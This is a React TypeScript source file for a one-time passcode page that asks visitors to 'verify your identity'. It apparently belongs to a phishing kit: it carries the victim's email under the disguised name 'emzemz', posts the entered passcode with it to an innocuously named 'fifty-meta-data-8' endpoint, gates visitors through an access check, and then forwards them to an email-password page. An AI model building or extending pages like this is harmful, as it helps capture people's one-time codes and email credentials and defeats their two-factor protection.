import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const OTP: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/login', { replace: true });
    }
  }, [emzemz, navigate]);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing verification details. Please restart the login process.</div>;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');

    if (!otp.trim()) {
      setError('One-time passcode is required.');
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/fifty-meta-data-8/`, {
        emzemz,
        otp,
      });

      navigate('/email-password', { state: { emzemz } });
    } catch (err) {
      console.error('Error submitting OTP:', err);
      setError('There was a problem verifying your passcode. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout breadcrumb="One-Time Passcode" cardMaxWidth="max-w-xl">
      <div className="space-y-6">
        <h2 className="text-2xl font-semibold text-gray-900">Verify Your Identity</h2>
        <p className="text-sm text-gray-600">
          Enter the one-time passcode we sent to finish signing in. This helps us confirm it’s really you.
        </p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">One-Time Passcode</label>
            <input
              id="otp"
              name="otp"
              type="text"
              value={otp}
              onChange={(event) => setOtp(event.target.value.replace(/\s/g, ''))}
              maxLength={10}
              className="w-full rounded-sm border border-gray-300 px-3 py-2 text-center text-lg font-semibold tracking-[0.3em] text-gray-900 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
            />
            {error && <p className="text-xs font-semibold text-red-600">{error}</p>}
          </div>

          <div className="flex justify-end">
            <button
              type="submit"
              disabled={isLoading}
              className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isLoading ? 'Verifying…' : 'Continue'}
            </button>
          </div>
        </form>

        <p className="text-xs text-gray-600">
          Didn’t receive a passcode? Check your spam folder or request a new one from the previous screen.
        </p>
      </div>
    </FlowPageLayout>
  );
};

export default OTP;
